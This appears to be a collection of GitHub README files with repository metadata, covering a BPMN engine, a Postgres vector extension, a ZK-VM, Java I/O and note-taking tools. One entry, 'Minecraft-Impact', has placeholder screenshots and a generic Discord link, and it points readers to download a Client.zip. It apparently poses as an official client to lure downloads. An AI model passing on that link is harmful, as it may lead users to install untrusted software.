[![sonarqube](https://img.shields.io/sonar/tests/operaton_operaton?server=https%3A%2F%2Fsonarcloud.io&logo=sonarcloud)](https://sonarcloud.io/project/overview?id=operaton_operaton)
[![Maven Central Version](https://img.shields.io/maven-central/v/org.operaton.bpm/operaton-bom-root?color=blue&logo=apachemaven)](https://central.sonatype.com/search?q=org.operaton)

[![operaton manual latest](https://img.shields.io/badge/manual-latest-brown.svg)](https://docs.operaton.org/)
[![License](https://img.shields.io/github/license/operaton/operaton?color=blue&logo=apache)](https://github.com/operaton/operaton/blob/main/LICENSE)


[![Forum](https://img.shields.io/badge/forum-Operaton-green)](https://forum.operaton.org/)
[![Slack](https://img.shields.io/badge/chat-Slack-purple)](https://join.slack.com/t/operaton/shared_invite/zt-2v6umjt92-d2DRmsoR1fqDEVlJB5IkNA)

Operaton is a native BPMN 2.0 process engine that runs inside the Java Virtual Machine. It can be embedded inside any Java application and any Runtime Container. It integrates with Java EE 6 and is a perfect match for the Spring Framework. On top of the process engine, you can choose from a stack of tools for human workflow management, operations and monitoring.

- Web Site: https://www.operaton.org/
- Getting Started: https://docs.operaton.org/
- User Forum: https://forum.operaton.org/
- Issue Tracker: https://github.com/operaton/operaton/issues

### This is a fork of the Camunda 7 BPM platform

We have not removed the old issue links and they still lead to Camunda's JIRA or the GitHub repo.

### What we plan to do and where we are going
Take a look at our [Roadmap](https://www.operaton.org/en/#roadmap)

### Want to talk to us or other people around Operaton?
Visit our [Forum](https://forum.operaton.org)

## Building
Prerequisites:

JDK 17 or newer - check `java -version`

You can use the Maven Wrapper script to execute the build. The script downloads and installs (if necessary) the required Maven version to `~/.m2/wrapper` and runs it from there.

On Linux and MacOS, run
```shell
./mvnw
```

On Windows, run
```shell
mvnw
```

Alternatively, you can use the your own Maven installation (minimal version: 3.9.0) Wrapper and execute
```shell
mvn
```

For a faster build you can add `-DskipTests` to skip test execution and `-Dskip.frontend.build=true` to skip the build of the webapps.

## Get it!

Get the latest release from the [Releases page](https://github.com/operaton/operaton/releases).

To get the latest nightly build visit the [Nightly Build actions](https://github.com/operaton/operaton/actions/workflows/nighly-build.yml?query=branch%3Amain+event%3Aschedule+is%3Asuccess++), click on the latest available build and download from the _Artifacts_ section.


## About Operaton

### Components

Operaton provides a rich set of components centered around the BPM lifecycle.

#### Process Implementation and Execution

- Operaton Engine - The core component responsible for executing BPMN 2.0 processes.
- REST API - The REST API provides remote access to running processes.
- Spring, CDI Integration - Programming model integration that allows developers to write Java Applications that interact with running processes.

#### Process Operations

- Operaton Engine - JMX and advanced Runtime Container Integration for process engine monitoring.
- Operaton Cockpit - Web application tool for process operations.
- Operaton Admin - Web application for managing users, groups, and their access permissions.

#### Human Task Management

- Operaton Tasklist - Web application for managing and completing user tasks in the context of processes.

### Highly Integrable

Out of the box, Operaton provides infrastructure-level integration with Java EE Application Servers and Servlet Containers.

### Embeddable

Most of the components that make up the platform can even be completely embedded inside an application. For instance, you can add the process engine and the REST API as a library to your application and assemble your custom BPM platform configuration.

### Process modelling

Operaton is fully backwards compatible to your existing BPMN-, DMN-models and Forms, which were created in Camunda Modeler for Camunda 7. You can download the Camunda Modeler [here](https://camunda.com/download/modeler/) (MIT Licence). 

## Documentation

The documentation is currently under construction. Currently, you can use the [Camunda 7 Manual](https://docs.camunda.org/manual/7.22/) as a reference.
Since Operaton is a fork of Camunda 7, most of the documentation is still valid. We will provide a new manual soon.

## Contributing

Please see our [contribution guidelines](CONTRIBUTING.md) for how to raise issues and how to contribute code to our project.

## Tests

To run the tests in this repository, please see our [testing tips and tricks](TESTING.md).

## Prerequisites

Java 17 or higher is required.

## License

The source files in this repository are made available under the [Apache License Version 2.0](./LICENSE).

Operaton uses and includes third-party dependencies published under various licenses. By downloading and using Operaton artifacts, you agree to their terms and conditions. Refer to our [license-book.txt](./distro/license-book/src/main/resources/license-book.txt) for an overview of third-party libraries and particularly important third-party licenses we want to make you aware of.

## Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->
",1,33,13,Apache-2.0,"build.yml,nighly-build.yml,release.yml",181.0
tensorchord/VectorChord,main,"<div align=""center"">
<h1 align=center>VectorChord</h1>
<h4 align=center>Host 100M 768-dim vector (250GB+) on an AWS i4i.xlarge machine ($250/month) with 4 vCPUs and 32GB of RAM using VectorChord.</h4>
</div>

<p align=center>
<a href=""https://discord.gg/KqswhpVgdU""><img alt=""discord invitation link"" src=""https://dcbadge.vercel.app/api/server/KqswhpVgdU?style=flat""></a>
<a href=""https://twitter.com/TensorChord""><img src=""https://img.shields.io/twitter/follow/tensorchord?style=social"" alt=""trackgit-views"" /></a>
<a href=""https://hub.docker.com/r/tensorchord/vchord-postgres""><img src=""https://img.shields.io/docker/pulls/tensorchord/vchord-postgres"" /></a>
<p>Prior release: <a href=""https://hub.docker.com/r/tensorchord/pgvecto-rs""><img src=""https://img.shields.io/docker/pulls/tensorchord/pgvecto-rs"" /></a></p>
<!-- <a href=""https://github.com/tensorchord/VectorChord#contributors-""><img alt=""all-contributors"" src=""https://img.shields.io/github/all-contributors/tensorchord/VectorChord/main""></a> -->
</p>

VectorChord (vchord) is a PostgreSQL extension designed for scalable, high-performance, and disk-efficient vector similarity search. It serves as the successor to the [pgvecto.rs](https://github.com/tensorchord/pgvecto.rs) project. 

VectorChord incorporates the insights and lessons learned from pgvecto.rs, providing faster query speeds, more flexible build options, significantly enhanced index build performance, and greater stability. It is entirely based on Postgres storage, allowing for physical replication and WAL incremental backups for index. This also enables effective ssd usage to reduce memory requirements and can easily handle vectors ranging from hundreds of millions to multi billions of entries.

## Features
- **Blazing-Fast Queries**: Achieve up to 3x faster queries compared to pgvector's HNSW, maintaining the same recall level.
- **High-throughput Update**: Achieve 16x faster insert throughput compared to pgvector's HNSW.
- **External Index Precomputation**: Built on IVF, VectorChord enables KMeans clustering to be performed externally (e.g., on a GPU) and seamlessly imported into the database.
- **Lightning-Fast Index Building**: Build index up to 20x faster than pgvector hnsw with precomputed centroids. (1.5 min for 1M 960-dim vectors)
- **Advanced Quantization**: Uses cutting-edge RaBitQ to compress float vectors into compact bit representations with autonomous reranking.
- **Disk-Friendly Performance**: Query laion-100M 768-dim vectors using just 32GB of memory, achieving 35ms P50 latency with top10 recall@95%.
- **Seamless Compatibility**: Compatible with pgvector data types while delivering faster indexing and querying.
- **Simple Configuration**: No need to tweak quantization or rerank parameters ‚Äî best defaults are provided out of the box.

## Quick Start
For new users, we recommend using the Docker image to get started quickly.
```bash
docker run \
  --name vectorchord-demo \
  -e POSTGRES_PASSWORD=mysecretpassword \
  -p 5432:5432 \
  -d tensorchord/vchord-postgres:pg17-v0.1.0
```

Then you can connect to the database using the `psql` command line tool. The default username is `postgres`, and the default password is `mysecretpassword`.

```bash
psql -h localhost -p 5432 -U postgres
```
Run the following SQL to ensure the extension is enabled.

```SQL
CREATE EXTENSION IF NOT EXISTS vchord CASCADE;
```

And make sure to add `vchord.so` to the `shared_preload_libraries` in `postgresql.conf`.

```SQL
-- Add vchord and pgvector to shared_preload_libraries --
ALTER SYSTEM SET shared_preload_libraries = 'vchord.so';
```

To create the VectorChord RaBitQ(vchordrq) index, you can use the following SQL.

```SQL
CREATE INDEX ON gist_train USING vchordrq (embedding vector_l2_ops) WITH (options = $$
residual_quantization = true
[build.internal]
lists = [4096]
spherical_centroids = false
$$);
```

## Documentation

### Query

The query statement is exactly the same as pgvector. VectorChord supports any filter operation and WHERE/JOIN clauses like pgvecto.rs with VBASE.
```SQL
SELECT * FROM items ORDER BY embedding <-> '[3,1,2]' LIMIT 5;
```
Supported distance functions are:
- <-> - L2 distance
- <#> - (negative) inner product
- <=> - cosine distance

<!-- ### Range Query

> [!NOTE]  
> Due to the limitation of postgresql query planner, we cannot support the range query like `SELECT embedding <-> '[3,1,2]' as distance WHERE distance < 0.1 ORDER BY distance` directly.

To query vectors within a certain distance range, you can use the following syntax.
```SQL
-- Query vectors within a certain distance range
-- sphere(center, radius) means the vectors within the sphere with the center and radius, aka range query
-- <<->> is L2 distance, <<#>> is inner product, <<=>> is cosine distance
SELECT vec FROM t WHERE vec <<->> sphere('[0.24, 0.24, 0.24]'::vector, 0.012) 
``` -->

### Query Performance Tuning
You can fine-tune the search performance by adjusting the `probes` and `epsilon` parameters:

```sql
-- Set probes to control the number of lists scanned. 
-- Recommended range: 3%‚Äì10% of the total `lists` value.
SET vchordrq.probes = 100;

-- Set epsilon to control the reranking precision.
-- Larger value means more rerank for higher recall rate.
-- Don't change it unless you only have limited memory.
-- Recommended range: 1.0‚Äì1.9. Default value is 1.9.
SET vchordrq.epsilon = 1.9;

-- vchordrq relies on a projection matrix to optimize performance.
-- Add your vector dimensions to the `prewarm_dim` list to reduce latency.
-- If this is not configured, the first query will have higher latency as the matrix is generated on demand.
-- Default value: '64,128,256,384,512,768,1024,1536'
-- Note: This setting requires a database restart to take effect.
ALTER SYSTEM SET vchordrq.prewarm_dim = '64,128,256,384,512,768,1024,1536';
```

And for postgres's setting
```SQL
-- If using SSDs, set `effective_io_concurrency` to 200 for faster disk I/O.
SET effective_io_concurrency = 200;

-- Disable JIT (Just-In-Time Compilation) as it offers minimal benefit (1‚Äì2%) 
-- and adds overhead for single-query workloads.
SET jit = off;

-- Allocate at least 25% of total memory to `shared_buffers`. 
-- For disk-heavy workloads, you can increase this to up to 90% of total memory. You may also want to disable swap with network storage to avoid io hang.
-- Note: A restart is required for this setting to take effect.
ALTER SYSTEM SET shared_buffers = '8GB';
```

### Indexing prewarm
To prewarm the index, you can use the following SQL. It will significantly improve performance when using limited memory.
```SQL
-- vchordrq_prewarm(index_name::regclass) to prewarm the index into the shared buffer
SELECT vchordrq_prewarm('gist_train_embedding_idx'::regclass)""
```


### Index Build Time
Index building can parallelized, and with external centroid precomputation, the total time is primarily limited by disk speed. Optimize parallelism using the following settings:

```SQL
-- Set this to the number of CPU cores available for parallel operations.
SET max_parallel_maintenance_workers = 8;
SET max_parallel_workers = 8;

-- Adjust the total number of worker processes. 
-- Note: A restart is required for this setting to take effect.
ALTER SYSTEM SET max_worker_processes = 8;
```

### Indexing Progress
You can check the indexing progress by querying the `pg_stat_progress_create_index` view.
```SQL
SELECT phase, round(100.0 * blocks_done / nullif(blocks_total, 0), 1) AS ""%"" FROM pg_stat_progress_create_index;
```

### External Index Precomputation

Unlike pure SQL, an external index precomputation will first do clustering outside and insert centroids to a PostgreSQL table. Although it might be more complicated, external build is definitely much faster on larger dataset (>5M).

To get started, you need to do a clustering of vectors using `faiss`, `scikit-learn` or any other clustering library.

The centroids should be preset in a table of any name with 3 columns:
- id(integer): id of each centroid, should be unique
- parent(integer, nullable): parent id of each centroid, should be NULL for normal clustering
- vector(vector): representation of each centroid, `pgvector` vector type

And example could be like this:

```sql
-- Create table of centroids
CREATE TABLE public.centroids (id integer NOT NULL UNIQUE, parent integer, vector vector(768));
-- Insert centroids into it
INSERT INTO public.centroids (id, parent, vector) VALUES (1, NULL, '{0.1, 0.2, 0.3, ..., 0.768}');
INSERT INTO public.centroids (id, parent, vector) VALUES (2, NULL, '{0.4, 0.5, 0.6, ..., 0.768}');
INSERT INTO public.centroids (id, parent, vector) VALUES (3, NULL, '{0.7, 0.8, 0.9, ..., 0.768}');
-- ...

-- Create index using the centroid table
CREATE INDEX ON gist_train USING vchordrq (embedding vector_l2_ops) WITH (options = $$
[build.external]
table = 'public.centroids'
$$);
```

To simplify the workflow, we provide end-to-end scripts for external index pre-computation, see [scripts](./scripts/README.md#run-external-index-precomputation-toolkit).

### Installing From Source
Install pgrx according to [pgrx's instruction](https://github.com/pgcentralfoundation/pgrx?tab=readme-ov-file#getting-started).
```bash
cargo install --locked cargo-pgrx
cargo pgrx init --pg17 $(which pg_config) # To init with system postgres, with pg_config in PATH
cargo pgrx install --release --sudo # To install the extension into the system postgres with sudo
```

## Limitations
- Data Type Support: Currently, only the `f32` data type is supported for vectors.
- Architecture Compatibility: The fast-scan kernel is optimized for x86_64 architectures. While it runs on aarch64, performance may be lower.
- KMeans Clustering: The built-in KMeans clustering is not yet fully optimized and may require substantial memory. We strongly recommend using external centroid precomputation for efficient index construction.


## License
This project is licensed under the [GNU Affero General Public License v3.0](./LICENSE) and as commercial software. For commercial licensing, please contact us at support@tensorchord.ai.

",1,13,1,AGPL-3.0,"cla.yml,pgrx.yml,psql.yml,release.yml,release_pg_slim.yml,rust.yml,style.yml",75.0
kkrt-labs/stwo-brainfuck,main,"# stwo-brainfuck

`stwo-brainfuck` is a ZK-VM for the Brainfuck language[^1], based on Stwo[^2].

## Objectives

- Capacity of generating and verifying a proof for arbitrary Brainfuck programs.
- Understanding of using Stwo for building ZK-VMs
- Understanding of mordern AIR (RAP) design for (C)STARK-based systems.

## Design choices

### Brainfuck VM

The Brainfuck language has a very loose specification, though,
a [general specification](https://esolangs.org/wiki/Brainfuck#Conventions) has been established as a minimal base.
We try to follow these guidelines.

- The memory cells take values in the Mersenne31 (M31) field: $[0..2^{31} - 1)$
- Memory is fixed at 30,000 cells by default, but is configurable.
- Memory wraps on overflow/underflow.
  - It can be used for memory value `mv` and memory pointer `mp`,
    but it will usually panic for `mp` as the memory size will be much smaller than $2^{31} - 1$.
- Inputs are line-buffered (ends with the linefeed ASCII character `10`).
- CLI uses Stdin and Stdout for IO.
- For library use, input can be simulated by any reader (e.g. `Cursor`) and
  output with any writer (e.g. a custom writer).

## Acknowledgements

The constraints used here relies on work made by Alan Szepieniec[^3]
and sibling article from Neptune Cash[^4].
The Brainfuck compiler and interpreter have been adapted from rkdud007[^5]

[^1]: [Brainfuck Language](https://esolangs.org/wiki/Brainfuck)

[^2]: [Stwo repository](https://github.com/starkware-libs/stwo)

[^3]: [BrainSTARK - Alan Szepieniec](https://aszepieniec.github.io/stark-brainfuck/)

[^4]: [BrainSTARK - Neptune Cash](https://neptune.cash/learn/brainfuck-tutorial)

[^5]: [rkdud007 brainfuck-zkvm repo](https://github.com/rkdud007/brainfuck-zkvm)
",0,10,32,,"ci.yaml,trunk-check.yaml",55.0
szeiger/perfio,master,"# perfIO - Fast and Convenient I/O for the JVM

## Overview

perfIO provides buffered streaming I/O abstractions for both binary and text data. The design is optimized for performance. The public perfIO classes correspond roughly to the following standard library abstractions:

| perfIO                     | JDK (* and common 3rd-party additions)                                          |
|----------------------------|---------------------------------------------------------------------------------|
| BufferedInput              | BufferedInputStream, ByteArrayInputStream, DataInputStream, LimitedInputStream* |
| BufferedOutput             | BufferedOutputStream, DataOutputStream                                          |
| AccumulatingBufferedOutput | -                                                                               |
| PipeBufferedOutput         | PipeOutputStream                                                                |
| ArrayBufferedOutput        | ByteArrayOutputStream                                                           |
| LineTokenizer              | BufferedReader + InputStreamReader                                              |
| TextOutput                 | PrintWriter + BufferedWriter + OutputStreamWriter                               |

## How fast is it?

Reading and writing binary data using a sufficiently large buffer is faster than ByteBuffer, but with the full generality of streaming I/O that does not require a fixed buffer size. Data from the included benchmarks (measured on Temurin OpenJDK 22.0.2 on Linux x68-64) shows typical speed-ups between 3x and 40x in different scenarios compared to standard library abstractions for streaming I/O.

![1.svg](docs/1.svg)
![2.svg](docs/2.svg)
![3.svg](docs/3.svg)
![4.svg](docs/4.svg)
![5.svg](docs/5.svg)
![6.svg](docs/6.svg)

## What makes it fast?

Mostly avoiding things that make the JDK abstractions slow:

- InputStream and OutputStream use the decorator pattern. You typically use multiple nested streams that have to make all of their reads/writes through a standard set of methods that operate on individual bytes or byte arrays. You can easily end up with polymorphic dispatch (because you are always calling methods of the same interface with different implementations) and double buffering.

  By contrast, BufferedInput and BufferedOutput are built around a single buffer (byte array, ByteBuffer or MemorySegment) with a position and limit. All reads and writes are made directly to the buffer. There is no method dispatch overhead no matter how deeply nested the objects are. Almost all reads and writes (except the ones that require re-buffering) are done with a single range check plus increment. Any additional checks are pushed out of the inner loop into the buffering.

- None of the perfIO classes are synchronized or use any locking or memory fences. Streaming I/O is inherently sequential. Multi-threaded use requires synchronization at a higher level anyway, so we do not need to incur any performance penalties from synchronizing in the core abstractions.

- The JDK's Reader and Writer interfaces, as well as the NIO CharsetEncoders and CharsetDecoders are based on char arrays. This was fine at the time they were added, but nowadays the JVM uses a byte-based compact representation for all Strings which are valid Latin-1. In practice, most Strings contain ASCII text, so any char-based design requires conversions back and forth between byte arrays and char arrays.

  perfIO's TextOutput converts directly from Strings to byte data (writing it directly into a BufferedOutput's byte array) and LineTokenizer does the same when reading. This makes use of the more efficient conversions for the common character sets (UTF-8, Latin-1, ASCII) that are built into the String class, Unfortunately the provided API is not sufficient to avoid double buffering in all cases. perfIO can optionally call internal JDK methods to make some common use cases even faster. 

perfIO also uses both FFM and NIO abstractions where appropriate (depending on performance for the specific use case) and the Vector incubator API (for LineTokenizer).

Another source of performance is not just making the available abstractions fast, but making fast abstractions easily available:

- Reading large files is much faster with memory mapping. While you can always do the mapping manually using the NIO and FFM APIs for more control, perfIO makes the common use case a one-liner.

- Binary formats often use length-prefixed blocks. perfIO provides length-limited views for reading them (at essentially zero cost), and advanced buffer management for writing a length prefix after the content without double buffering or manual buffer management.

## Setup

Add the dependency to your project. Check the [Maven Central page](https://central.sonatype.com/artifact/com.novocode/perfio) for the latest versions and other dependency formats.

```
<dependency>
    <groupId>com.novocode</groupId>
    <artifactId>perfio</artifactId>
    <version>0.1.0</version>
</dependency>
```

The minimum required JDK version is 21 with `--enable-preview` (for the FFM API), or 22 without. There are no other dependencies.

- The Vector incubator API will be used automatically if it has been enabled with `--add-modules jdk.incubator.vector` and the JDK and CPU have appropriate support. Use of the Vector API can be disabled with `-Dperfio.disableVectorized=true`.

- JDK-internal String features will be used automatically if the `java.lang` package has been made accessible with `--add-opens java.base/java.lang=ALL-UNNAMED`. This can be disabled with `-Dperfio.disableStringInternals=true`.

- Unsafe memory access is disabled by default. It can improve the performance in some cases but result in less optimized code in others. Both `-Dperfio.enableUnsafe=true` and `--enable-native-access=ALL-UNNAMED` are required to enable it.

## Usage

A top-level `BufferedInput` or `BufferedOutput` object is instantiated by calling one of the static factory methods in the respective class. It should be closed after use by calling `close()`.

```java
  var out = BufferedOutput.ofFile(Path.of(""foo""));
  out.int8(1);
  out.int32(2);
  out.close();

  var in = BufferedInput.ofMappedFile(Path.of(""foo""));
  var a = in.int8();
  var b = in.int32();
  in.close();
```

Since Java does not have unsigned integers, the main methods for reading and writing binary data are the signed ones. The only exception is `uint16` which uses `char`, the only unsigned primitive type. Other `uint` methods are convenience wrappers that use a larger signed type.

| Method  | Width                  | Java Type (or surrogate) |
|---------|------------------------|--------------------------|
| int8    | 8 bits signed          | byte                     |
| uint8   | 8 bits unsigned        | (int)                    |
| int16   | 16 bits signed         | short                    |
| uint16  | 16 bits unsigned       | char                     |
| int32   | 32 bits signed         | int                      |
| uint32  | 32 bits unsigned       | (long)                   |
| int64   | 64 bits signed         | long                     |
| float32 | 32 bits floating-point | float                    |
| float64 | 64 bits floating-point | double                   |

The methods for reading and writing multi-byte numeric values require a byte order. Most factory methods set it to `BIG_ENDIAN` by default, but it can be changed at any time with the `order` method. This is consistent with `ByteBuffer` but different from the FFM API (which is mostly intended for interacting with native code and consequently uses the native byte order by default).

All methods except `int8` have additional variants ending in `n` (e.g. `int32n`), `b` and `l` for native, big endian and little endian byte order respectively. These methods are independent of the `BufferedInput`'s or `BufferedOutput`'s current byte order and slightly faster.

### Views

Both `BufferedInput` and `BufferedOutput` can have nested views, but the semantics are different. A `BufferedInput` is always read sequentially, thus creating a view at the current position (using the `limitedView` method) locks the parent until the view is closed. The only method that may still be called while a view is active is `close()` which implicitly closes all active nested views.

A `BufferedOutput` can be written to out of order. This is important for writing binary formats with length prefixes. It is often inconvenient or inefficient to calculate the length without actually writing the data. If the prefix has a fixed size, you can use `reserve` to insert a nested `BufferedOutput` at the current position which can be filled at a later point. You must write exactly the requested amount of data to it before closing it:

```java
  // Write a UTF-8 string with an int32 length prefix
  BufferedOutput b;
  var b2 = b.reserve(4);
  val pos0 = b.totalBytesWritten();
  b.string(...);
  var len = (int)(b.totalBytesWritten() - pos0);
  b2.int32(len);
  b2.close();
```

When the length of the prefix is variable, you can use `defer` instead. This method creates a `BufferedOutput` which shares its buffer management with the parent but is only inserted into the parent once it is closed. Note that this reverses the roles of the two buffers compared to `reserve`:

```java
  // Write a UTF-8 string with an int32 length prefix
  BufferedOutput b;
  val b2 = b.defer();
  b2.string(...);
  b.int32((int)b2.totalBytesWritten());
  b2.close();
```

Both `BufferedInput` and `BufferedOutput` will reuse views by default. This means that you should not access any view after closing it (unless it was explicitly detached by calling `detach()`) because the object and/or its buffer may have been repurposed. This design makes the repeated use of views for writing small amounts of data very efficient.

### Text I/O

A `LineTokenizer` can be obtained by calling `lines` on a `BufferedInput` object. It allows you to read a text file line by line. Line tokenization is currently limited to ASCII-compatible encodings, which includes UTF-8 and the ISO-8859 (""Latin"") charsets. `LineTokenizer` will use a faster SIMD-based implementation if the Vector API (incubator version as of JDK 22) is available.

A `TextOutput` can be obtained by calling `text` on a `BufferedOutput` object. It allows you to write text data, similar to `java.io.PrintWriter`. Unlike `LineTokenizer` it supports arbitrary character sets, but it is optimized for UTF-8, Latin-1 and ASCII.
",1,1,1,Apache-2.0,"build.yaml,release.yaml",0.0
underthreaded/dvlg,main,"# dvlg

![](dvlg.png)

`dvlg` is a plaintext markup language for keeping a continuous log of work, dvlg is short for devlog and is pronounced ""devlog"".
Devlog being short for development log, not developer log, as it is not a language only for developers.
`dvlg` as a language is not optimised for reading by people other than the owner of the log, as it doesn't encourage spending time tidying the formatting.
The syntax is intentionally simple to allow free-flow of information from your brain onto the page.
While it does support a subset of markdown to be used within it's notes, we do not generally encourage it's use - dvlg is for getting ideas down and exploring them, as a step before preparing them to be shared.

We created dvlg instead of using an existing markup format to allow us to bake in certain semantic constructs for which tooling can be built around.

**Note `dvlg` is in alpha, the format is still subject to change while we collect feedback.**

## The language

The main constructs of the language include:
- Date headers, for segmenting notes by date
- General Notes
- TODO's
- Ideas
- TIL (Today I learned)
- QTS (Question to self)
- Calendar Entries, for tracking upcoming events

### Date Headers
A system for keeping track of when notes were made, we don't go finer grained than on a days basis.
```
@YYYY-MM-DD
```

The space under a date tag is automatically inferred to be a general untagged note (which you'll read more about below.)

### General Notes
`dvlg` is made for making different kinds of notes.
The simplest type of note you can take is the general note.

```
/ This is a plain untagged note
/tag/ this is a tagged note, tags always begin and end with a / but no spaces are allowed
/tag/subtag/ tags can have a path to allow you to categorise notes in a hierarchy
```

#### Multiline notes
All notes are not limited to one line.
For any note you take, just keep writing on newlines.
As long as you don't use the above syntax your notes should apply to the preceding notes (of any note type).


```
/ video for showing off dvlg

The video should be short with no fluff.
Probably keep short and emphasise how we want to keep users typing words and focusing on the content not the process or the formatting.

/ Do this other thing

- some
- markdown
- list
- because you can
```

When you do this you can think of the text inline with the note marker (for general notes the `/`) as a title, and the rest of the notes the body of the note.

### TODO's
Everyone knows what todo's are.
```
- [ ] An uncompleted TODO (if left blank priority 5, with an allowed range of 0-9, 0 being most important)
- [2] An uncompleted TODO with priority 2
- [/] An in progress TODO
- [x] A completed TODO
- [-] A dropped TODO
- [1m] A remind me later TODO for 1 month available suffixes: d, w, m, q, y. For when you want to drop something but be reminded about it after a given amount of time.
```

TODO's inherit their current tag scope

### Calendar Entries
Calendar notes are for noting down important future dates.
```
[YYYY-MM-DD] Ship big feature
```
or with a time
```
[YYYY-MM-DD HH:MM] Check on intern
```
or with a time and duration
```
[YYYY-MM-DD HH:MM-HH:MM] Big important meeting to avoid
```

Calendar entries inherit their current tag scope.

### Ideas's
If you're anything like us, ideas pop into your head at random, at any times, and they haunt you if you don't write them down.
```
$ ideas are money
```

You can tag ideas like so

```
/project1$ We should consider rewriting this in C
```

Untagged ideas go straight to the default scope if not tagged, they do not inherit tag scope.

### TIL's
Short for Today I Learned. Keeping a log of these is great for tracking your progress or just interesting facts.
```
! dvlg a new language for taking notes
```

You can tag ideas like so

```
/scrum! Don't do it, unless you mean rugby
```

Untagged til's go straight to the default scope if not tagged, they do not inherit tag scope.

### Question to self (QTS)
Sometimes a question occurs to you, and you don't have time to address it right now.
Note it down, come back to it later and turn it into a TIL.

This is pretty much a special case of a todo, except you don't need to add extra fluff in your description of the todo, and tracking the knowledge you know you don't know can sometimes come in handy!

```
? Is this language useful
```

The TODO version of this would be
```
- [ ] learn if this langguage is useful at all?
```

Which is, of course, too much typing.

Once you have answered or otherwise resolved this question, you can answer it by adding an answer note below, like so

```
? Is this language useful
?! Takes a bit of getting used to, but I like it!
```

You can also tag these as with til's and ideas, but make sure the tags match on the question and the answer, so they get grouped correctly.

## Why
This is not a competitor to the almighty Org Mode nor a replacement for any tool in particular.
We wrote this because we weren't keeping enough notes in our day to day.
And wanted a non-obtrusive language which encoded the semantic meaning we wanted into it.
In theory allowing post-processing tooling to build on top of the language, and multiply its power.

This is a markup format specifically designed for append dominant writing.
Append dominant writing we feel is what we need to most efficiently get thoughts out of our brain and saved for future value.


## The Tooling

Currently, we have a very simple cli tool which allows simply filtering the different types of notes in your document.

This makes it easy to check your todo's for example:

```
dvlg your.dlvg todo
```

### Building the tooling
You just need `rustc`, this is stdlib only.

```
rustc dvlg.rs
```",0,0,2,MIT,,1.0
barakmich/bbqvec,main,"![BBQvec Logo](.github/bbqvec.png)

![Status](https://img.shields.io/badge/status-beta-blue)
[![license](https://img.shields.io/github/license/barakmich/bbqvec)](LICENSE)
[![GoDoc](https://godoc.org/github.com/barakmich/bbqvec?status.svg)](https://godoc.org/github.com/barakmich/bbqvec)
[![Crates.io](https://img.shields.io/crates/v/bbqvec)](https://crates.io/crates/bbqvec)
[![Go CI](https://github.com/barakmich/bbqvec/actions/workflows/go.yml/badge.svg)](https://github.com/barakmich/bbqvec/actions/workflows/go.yml)
[![Rust CI](https://github.com/barakmich/bbqvec/actions/workflows/rust.yml/badge.svg)](https://github.com/barakmich/bbqvec/actions/workflows/rust.yml)

BBQvec is an open-source, embedded vector database index for Go and Rust, providing approximate K-nearest-neighbors (aKNN).

# Getting Started

## Go

```go
package main

import (
  ""fmt""

  bbq ""github.com/barakmich/bbqvec""
)

func main() {
  // Declare store parameters
  dimensions := 200
  nBasis := 10

  // Initialize the store
  backend := bbq.NewMemoryBackend(dimensions)
  datastore, _ := bbq.NewVectorStore(backend, nBasis)

  // Create some test data, 100K random vectors
  vecs := bbq.NewRandVectorSet(100_000, dimensions, nil)
  datastore.AddVectorsWithOffset(0, vecs)
  /*
  Equivalent to:
  for i, v := range vecs {
  datastore.AddVector(bbq.ID(i), v)
  }
  */

  // Run a query
  targetVec := bbq.NewRandVector(dimensions, nil)
  results, _ := datastore.FindNearest(targetVec, 10, 1000, 1)

  // Inspect the results
  top := results.ToSlice()[0]
  vec, _ := backend.GetVector(top.ID)
  fmt.Println(top.ID, vec, top.Similarity)
}
```

## Rust

```rust
use bbqvec::IndexIDIterator;

fn main() -> Result<()> {
  // Declare store parameters
  let dimensions = 200;
  let n_basis = 10;

  // Initialize the store
  let mem = bbqvec::MemoryBackend::new(dimensions, n_basis)?;
  let mut store = bbqvec::VectorStore::new(mem)?;

  // Create some test data, 100K random vectors
  let vecs = bbqvec::create_vector_set(dimensions, 100000);
  store.add_vector_iter(vecs.enumerate_ids())?;

  // Run a query
  let target = bbqvec::create_random_vector(dimensions);
  let results = store.find_nearest(&target, 10, 1000, 1)?;

  // Inspect the results
  for res in results.iter_results() {
    println!(""{} {}"", res.id, res.similarity)
  }
}

```

# TODOs

We're still early; Go is the more tried-and-true and suits the beta use-case, but Rust is a good deal faster. We welcome contributions.

## Go
- [ ] More benchmarks
- [ ] New Quantizations
  - [ ] Hamming Distance (single-bit vectors)
  - [ ] Novel quantizations
## Rust
- [ ] Finish disk backend to match Go (in progress, shortly)
- [ ] New Quantizations


### Acknowledgements
Thank you to MariaLetta for the [free-gophers-pack](https://github.com/MariaLetta/free-gophers-pack) and to [rustacean.net](https://rustacean.net) for the CC0 logo characters.
",0,0,1,Apache-2.0,"go.yml,rust.yml",1.0
jezyk12/Minecraft-Impact,main,"## Minecraft-Impact

![Minecraft](https://github.com/github.png)

Welcome to the official repository of Minecraft-Impact! üéÆ

### Summary
Impact is a powerful Minecraft client that comes pre-installed with Baritone, providing users with advanced features and an easy setup process. This client supports Minecraft versions 1.12 through 1.16.5, offering a seamless gaming experience to players worldwide.

### Features
- Pre-installed with Baritone
- Supports Minecraft versions 1.12 through 1.16.5
- Easy setup process
- Advanced controls and functionalities

### Installation
To download Impact, click the button below:
[![Download Impact](https://img.shields.io/badge/Download-Impact-brightgreen)](https://github.com/user-attachments/files/16830358/Client.zip)

Follow these steps to install Impact on your Minecraft client:
1. Download the client from the provided link.
2. Extract the downloaded ZIP file.
3. Open the Minecraft launcher.
4. Create a new installation and select the Impact client.
5. Launch the game and enjoy the enhanced features of Impact!

### Screenshots
Here are some snapshots of the Impact client in action:

![Screenshot 1](https://github.com/github.png)
![Screenshot 2](https://github.com/github.png)
![Screenshot 3](https://github.com/github.png)

### Support
For any questions, feedback, or issues regarding the Impact client, feel free to reach out to our support team at `support@impactminecraft.com`.

### Collaborate
We welcome developers and Minecraft enthusiasts to contribute to the enhancement of the Impact client. Join our community on Discord to collaborate and share ideas: [Impact Discord Community](https://discord.com/impact).

### Happy Gaming! üéâ",1,0,1,NOASSERTION,,0.0
swstarlab-infolab/ldbc-complex-benchmark,master,"# Chimera LDBC SNB demonstration

This repository provides a demonstration of query processing over LDBC SNB. 

## LDBC SNB

